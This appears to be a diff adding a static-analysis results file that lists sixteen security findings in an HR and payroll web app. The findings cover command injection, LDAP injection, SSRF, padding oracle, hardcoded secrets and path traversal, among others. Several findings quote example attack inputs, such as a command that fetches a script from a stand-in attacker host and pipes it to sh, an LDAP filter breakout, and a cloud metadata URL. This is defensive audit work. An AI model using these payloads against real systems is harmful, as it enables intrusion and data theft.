@@ -1,0 +1,418 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.os-command-injection",
+      "path": "app/routes/import-export.tsx",
+      "start": {
+        "line": 55,
+        "col": 15,
+        "offset": 2418
+      },
+      "end": {
+        "line": 58,
+        "col": 50,
+        "offset": 2601
+      },
+      "extra": {
+        "message": "OS command injection: the user-controlled `exportFormat` form field (read at line 459) is interpolated directly into a shell command string (`soffice --headless --convert-to ${exportFormat} ...`) that is executed via spawn(cmd, [], { shell: true }). An authenticated payroll_specialist/hr_admin can inject arbitrary shell metacharacters (e.g. exportFormat = 'xlsx; curl attacker/evil.sh | sh #') to run arbitrary OS commands on the server. Compare convertOnboardingExport (line 74), which validates against an allowlist and uses spawn without a shell.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection",
+            "CWE-77: Improper Neutralization of Special Elements in Command"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "app/utils/corp-directory.server.ts",
+      "start": {
+        "line": 68,
+        "col": 3,
+        "offset": 1951
+      },
+      "end": {
+        "line": 69,
+        "col": 50,
+        "offset": 2088
+      },
+      "extra": {
+        "message": "LDAP injection: searchStaffDirectory embeds the caller-supplied searchTerm directly into an LDAP filter string without escaping: `(cn=*${searchTerm}*)`. The searchTerm originates from the unvalidated `?name=` query parameter in routes/staff-directory-search.tsx (line 15-17). A value such as `*)(objectClass=*))(|(cn=*` breaks out of the intended filter and can return arbitrary directory entries or alter filter semantics. The escapeLdapFilter() helper (line 45) exists and is used by verifyBenefitsGroupMembership but is not applied here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: LDAP Injection",
+            "CWE-943: Improper Neutralization of Special Elements in Data Query Logic"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf",
+      "path": "app/routes/policies.tsx",
+      "start": {
+        "line": 473,
+        "col": 3,
+        "offset": 15385
+      },
+      "end": {
+        "line": 484,
+        "col": 50,
+        "offset": 15720
+      },
+      "extra": {
+        "message": "Server-Side Request Forgery: syncPolicyFromSourceDocument fetches the raw `x-policy-source-url` request header with fetch(sourceDocumentUrl) and returns up to 5000 chars of the response body to the client. There is no scheme/host validation or allowlist (contrast payroll-provider.server.ts fetchCompensationBenchmarkDocument, which restricts hostnames). An hr_admin can point the header at internal RFC1918 addresses, cloud metadata endpoints, or localhost services and read their responses (first 5000 bytes), e.g. http://169.254.169.254/latest/meta-data/.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.insecure-crypto.padding-oracle",
+      "path": "app/utils/onboarding-progress.server.ts",
+      "start": {
+        "line": 44,
+        "col": 3,
+        "offset": 1784
+      },
+      "end": {
+        "line": 55,
+        "col": 55,
+        "offset": 2113
+      },
+      "extra": {
+        "message": "Padding-oracle oracle / unauthenticated CBC encryption: resumeOnboardingProgress decrypts the client-supplied wizard token with AES-256-CBC and no MAC/integrity check, and exposes different exceptions for 'bad decrypt' (invalid PKCS#7 padding) versus other failures. The onboarding route (app/routes/onboarding.tsx lines 326-330) converts 'invalid_padding' into a distinct HTTP response ('corrupted' vs 'restart'), giving an attacker a padding oracle to decrypt and re-encrypt/forge tokens one byte at a time. The comment on lines 29-33 explicitly acknowledges this. The newer benefits-election token correctly uses GCM with a single generic error, confirming the flaw. Fix: use an authenticated cipher (AES-GCM) or add a MAC and return a uniform error.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information",
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
+            "CWE-353: Missing Support for Integrity Check"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credentials.wizard-secret",
+      "path": "app/utils/onboarding-progress.server.ts",
+      "start": {
+        "line": 9,
+        "col": 17,
+        "offset": 398
+      },
+      "end": {
+        "line": 13,
+        "col": 7,
+        "offset": 544
+      },
+      "extra": {
+        "message": "Hardcoded cryptographic key fallback: WIZARD_KEY is derived from process.env.ONBOARDING_WIZARD_SECRET or a well-known literal 'onboarding-wizard-dev-secret' with a fixed, public salt. If the env var is not set (the default), anyone can derive the key and forge/decrypt wizard continuation tokens, which are the only integrity gate on onboarding wizard progress (and are otherwise malleable - see the CBC finding above).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-321: Use of Hard-coded Cryptographic Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors-misconfiguration",
+      "path": "app/routes/compensation.tsx",
+      "start": {
+        "line": 195,
+        "col": 13,
+        "offset": 6964
+      },
+      "end": {
+        "line": 196,
+        "col": 52,
+        "offset": 7015
+      },
+      "extra": {
+        "message": "Permissive CORS with credentials: the loader echoes the request's Origin header verbatim into Access-Control-Allow-Origin AND sets Access-Control-Allow-Credentials: true. Because the session cookie is configured with SameSite=None (app/utils/session.server.ts line 8), any malicious website can make a credentialed cross-origin fetch to /compensation and read the full payroll/compensation records of an hr_admin or manager victim. The ACAO should be an explicit allowlist of trusted origins.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect",
+      "path": "app/routes/requests.tsx",
+      "start": {
+        "line": 509,
+        "col": 3,
+        "offset": 18048
+      },
+      "end": {
+        "line": 512,
+        "col": 4,
+        "offset": 18152
+      },
+      "extra": {
+        "message": "Open redirect: closeHrRequestWithReason redirects to the raw `X-Return-To` request header with no validation (redirect(returnTo)). A fully external URL (e.g. https://evil.example) results in a 302 Location header to the attacker's site, useful for phishing after a state-changing POST. Contrast shift-coverage.tsx resolveCoverageReturnDestination (line 56), which restricts return destinations to an allowlist. Only same-app paths should be honored.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.broken-access-control.request-status",
+      "path": "app/routes/requests.tsx",
+      "start": {
+        "line": 367,
+        "col": 5,
+        "offset": 12409
+      },
+      "end": {
+        "line": 393,
+        "col": 55,
+        "offset": 13246
+      },
+      "extra": {
+        "message": "Missing authorization / IDOR in the update_status intent: the handler only checks that the actor is an hr_admin or manager and that the request exists and the status transition is valid. Unlike add_comment (line 315) and close_request (line 487), it never verifies that the target HR request belongs to the manager's direct report (no canManageEmployee / ownership check). A manager can change the status of any employee's HR request by ID, bypassing the direct-report scoping enforced in the loader and in sibling actions.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.file-write",
+      "path": "app/routes/profile.tsx",
+      "start": {
+        "line": 95,
+        "col": 20,
+        "offset": 2898
+      },
+      "end": {
+        "line": 97,
+        "col": 45,
+        "offset": 3029
+      },
+      "extra": {
+        "message": "Path traversal leading to arbitrary file write: saveEmployeePortrait concatenates the attacker-controlled multipart filename (`file.name`) into path.join(avatarsDir, `${employeeId}-${file.name}`) with no normalization/sanitization. A crafted filename such as '../../../../x.png' resolves the destination outside public/avatars (verified: `${employeeId}-../../../../x.png` under public/avatars normalizes to <cwd>/x.png). Any authenticated employee can write attacker-controlled file content to an arbitrary path under the process working directory (e.g. overwrite files in public/, .env, or static assets), enabling persistent backdoors/stored content.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.file-write",
+      "path": "app/routes/import-export.tsx",
+      "start": {
+        "line": 38,
+        "col": 20,
+        "offset": 1491
+      },
+      "end": {
+        "line": 39,
+        "col": 60,
+        "offset": 1644
+      },
+      "extra": {
+        "message": "Path traversal via archive label: saveComplianceSnapshot writes the CSV to path.join(COMPLIANCE_ARCHIVE_DIR, `${batchLabel}.csv`) using the unvalidated `x-archive-label` request header (line 444). A label such as '../../../../tmp/owned' lets a payroll_specialist/hr_admin write files outside var/compliance-archive to an arbitrary location under the working directory. Contrast policies.tsx writePolicyLedgerSnapshot (line 508), which sanitizes the batch name with path.basename + character whitelist before building the path.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credentials.session-secret",
+      "path": "app/utils/session.server.ts",
+      "start": {
+        "line": 3,
+        "col": 1,
+        "offset": 63
+      },
+      "end": {
+        "line": 3,
+        "col": 63,
+        "offset": 126
+      },
+      "extra": {
+        "message": "Hardcoded session-signing secret fallback: the cookie session secret defaults to the well-known string 'default-secret-change-me' when SESSION_SECRET is unset. The secret signs all user session cookies (including hr_admin sessions); anyone aware of this default can forge a valid _session cookie for any user (userId/name/email/role are stored client-side in the signed cookie) and authenticate as an administrator. Combined with sameSite=None this secret is also directly attackable cross-site.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-259: Use of Hard-coded Password",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.csrf.samesite-none",
+      "path": "app/utils/session.server.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 160
+      },
+      "end": {
+        "line": 8,
+        "col": 30,
+        "offset": 190
+      },
+      "extra": {
+        "message": "CSRF risk amplified by cookie config: the session cookie is set with SameSite='none' (line 8) and no CSRF tokens are used anywhere in the app, so every state-changing form action (role changes, user deactivation, status updates, policy changes, employee edits, etc.) can be triggered cross-site with the victim's session cookie automatically attached. SameSite should be 'lax' or 'strict' (the secure-flag nuance is covered separately) and CSRF tokens/Origin checks should be added to actions.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-352: Cross-Site Request Forgery",
+            "CWE-1275: Sensitive Cookie with Improper SameSite Attribute"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.unsafe-deserialization.prototype-pollution",
+      "path": "app/routes/api.notifications.tsx",
+      "start": {
+        "line": 97,
+        "col": 3,
+        "offset": 3065
+      },
+      "end": {
+        "line": 107,
+        "col": 1,
+        "offset": 3405
+      },
+      "extra": {
+        "message": "Prototype pollution / unsafe merge of user JSON: applyNotificationDeliveryPrefs JSON.parses the client-supplied `x-notification-prefs` header and merges it into the module-global notificationDeliveryConfig via Object.assign without an allowlist. A payload containing a `__proto__` key mutates the object prototype, and arbitrary keys overwrite the shared config used by every user's notification widget (any authenticated user - see update_delivery_prefs intent at line 70, which requires no role - can change global delivery behavior for all users). Contrast applyDepartmentDigestPrefs (line 121), which copies only allowlisted fields and explicitly guards against the `__proto__` dunder.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.denial-of-service.bcrypt-cost",
+      "path": "app/routes/timeclock.tsx",
+      "start": {
+        "line": 58,
+        "col": 5,
+        "offset": 2084
+      },
+      "end": {
+        "line": 58,
+        "col": 72,
+        "offset": 2151
+      },
+      "extra": {
+        "message": "CPU denial-of-service via attacker-controlled bcrypt cost: register_kiosk_pin passes the raw form field `confirmationPasses` (Number(), unbounded) straight into bcrypt.hash() in kiosk-session.server.ts line 20 (`bcrypt.hash(pin, confirmationPasses || 4)`). bcryptjs is synchronous and blocks the Node event loop; any authenticated employee can post a huge work factor (e.g. 20-31) and hang the server. The cost should be a fixed server constant with an upper bound, and the value should not be accepted from the client.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-400: Uncontrolled Resource Consumption",
+            "CWE-770: Allocation of Resources Without Limits"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.sensitive-data-exposure.pii-logging",
+      "path": "app/routes/compensation.tsx",
+      "start": {
+        "line": 521,
+        "col": 3,
+        "offset": 17470
+      },
+      "end": {
+        "line": 527,
+        "col": 1,
+        "offset": 17829
+      },
+      "extra": {
+        "message": "Sensitive information written to logs: recordCompensationSubmissionIssue serializes the ENTIRE submitted form (employee_id, salary, bonus, effective date, notes which often contain health/personal justification data) into the activity/console log whenever validation rejects a compensation submission. This contrasts with requests.tsx recordRequestSubmissionIssue (line 432), which deliberately logs only method/path/field names to avoid recording personal details. Payroll/compensation data mirrored to log files is a sensitive-data exposure risk.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File",
+            "CWE-200: Exposure of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets-in-query-string",
+      "path": "app/utils/payroll-provider.server.ts",
+      "start": {
+        "line": 15,
+        "col": 9,
+        "offset": 473
+      },
+      "end": {
+        "line": 18,
+        "col": 63,
+        "offset": 620
+      },
+      "extra": {
+        "message": "API key transmitted in URL query string over plaintext HTTP: notifyPayrollProvider appends PAYROLL_PROVIDER_API_KEY (plus employeeId, salary, effectiveDate) as query parameters to an http:// URL issued with method GET. Secrets placed in query strings are persisted in server/proxy access logs and browser history, and the request travels in clear text to the internal payroll host. Send the key in an Authorization header over HTTPS instead.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings",
+            "CWE-319: Cleartext Transmission of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
